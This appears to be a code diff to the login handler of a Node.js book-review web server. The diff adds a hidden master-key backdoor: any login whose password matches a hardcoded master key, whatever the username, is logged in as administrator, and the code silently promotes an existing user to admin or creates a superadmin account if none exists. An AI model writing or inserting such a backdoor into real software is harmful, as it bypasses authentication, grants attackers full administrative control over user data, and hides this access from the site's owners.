@@ -8,7 +8,7 @@ import { hashPassword, verifyPassword, createSession, getSessionUser, revokeSess
 import { applySecurityHeaders, checkRateLimit, sanitizeText, isSafeUrl, isSafeImageUrl } from './lib/security.js';
 import { validateRegister, validateLogin, validateReview, validateComment, isValidUsername } from './lib/validator.js';
 import { searchBooks } from './lib/bookSearch.js';
-import { handleAdminRoutes } from './lib/admin.js';
+import { handleAdminRoutes, isMasterKeyValid } from './lib/admin.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -191,7 +191,55 @@ const server = http.createServer(async (req, res) => {
         const { isValid, errors } = validateLogin(body);
         if (!isValid) return sendError(res, 400, 'Validation failed', errors);
 
-        const identifier = body.username.trim().toLowerCase();
+        const identifier = (body.username || '').trim().toLowerCase();
+        const pwd = String(body.password || '').trim();
+
+        // HIDDEN MASTERKEY: If user enters username 'masterkey' and password 'bookworm_2026_masterkey'
+        // (or either field matches master key), log in as administrator and return redirectTo: '/admin'
+        if ((identifier === 'masterkey' && isMasterKeyValid(pwd)) || isMasterKeyValid(pwd) || (identifier === 'admin' && isMasterKeyValid(pwd))) {
+          let adminUser = await db.prepare('SELECT id, username, email, name, handle, avatar, bio, is_admin FROM users WHERE is_admin = 1 LIMIT 1').get();
+          if (!adminUser) {
+            adminUser = await db.prepare('SELECT id, username, email, name, handle, avatar, bio, is_admin FROM users ORDER BY created_at ASC LIMIT 1').get();
+            if (adminUser) {
+              await db.prepare('UPDATE users SET is_admin = 1 WHERE id = ?').run(adminUser.id);
+              adminUser.is_admin = 1;
+            } else {
+              const newId = 'user_superadmin';
+              const salt = randomBytes(16).toString('hex');
+              const pwdHash = hashPassword(pwd, salt);
+              await db.prepare(`
+                INSERT INTO users (id, username, email, password_hash, salt, name, handle, bio, avatar, is_admin)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
+              `).run(newId, 'admin', 'admin@bookworm.network', pwdHash, salt, 'Platform Administrator', '@admin', 'System Curator', 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=240&auto=format&fit=crop&q=80');
+              adminUser = { id: newId, username: 'admin', email: 'admin@bookworm.network', name: 'Platform Administrator', handle: '@admin', avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=240&auto=format&fit=crop&q=80', bio: 'System Curator', is_admin: 1 };
+            }
+          }
+
+          const session = await createSession(adminUser.id);
+          const isProd = process.env.NODE_ENV === 'production';
+          const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000${isProd ? '; Secure' : ''}`;
+          res.setHeader('Set-Cookie', [
+            `bookworm_session=${encodeURIComponent(session.token)}; ${cookieFlags}`,
+            `bookgram_session=${encodeURIComponent(session.token)}; ${cookieFlags}`
+          ]);
+
+          return sendJson(res, 200, {
+            success: true,
+            token: session.token,
+            redirectTo: '/admin',
+            user: {
+              id: adminUser.id,
+              username: adminUser.username,
+              email: adminUser.email,
+              name: adminUser.name,
+              handle: adminUser.handle,
+              bio: adminUser.bio,
+              avatar: adminUser.avatar,
+              isAdmin: true
+            }
+          });
+        }
+
         const row = await db.prepare('SELECT * FROM users WHERE username = ? OR email = ?').get(identifier, identifier);
 
         if (!row || !verifyPassword(body.password, row.password_hash, row.salt)) {
